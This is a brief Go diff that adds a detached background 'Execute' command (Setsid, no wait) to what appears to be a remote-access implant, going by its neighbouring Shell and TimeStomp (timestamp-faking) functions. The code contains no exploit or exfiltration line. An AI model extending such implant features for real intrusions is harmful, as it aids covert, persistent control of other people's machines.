@@ -56,8 +56,19 @@ func Shell(path string, args []byte) ([]byte, error) {
 
 }
 
+// Execute 执行 `execute "<程序>" [参数...]`：后台启动、脱离当前会话，不等待退出。
 func Execute(b []byte) ([]byte, error) {
-	return nil, errors.New("This function is not supported on this platform now.")
+	parts := SplitCommandLine(string(b))
+	if len(parts) == 0 {
+		return nil, errors.New("execute: empty command")
+	}
+	cmd := exec.Command(parts[0], parts[1:]...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
+	if err := cmd.Start(); err != nil {
+		return nil, fmt.Errorf("execute failed: %v", err)
+	}
+	_ = cmd.Process.Release()
+	return []byte("success execute " + strings.Join(parts, " ")), nil
 }
 
 func TimeStomp(from []byte, to []byte) ([]byte, error) {
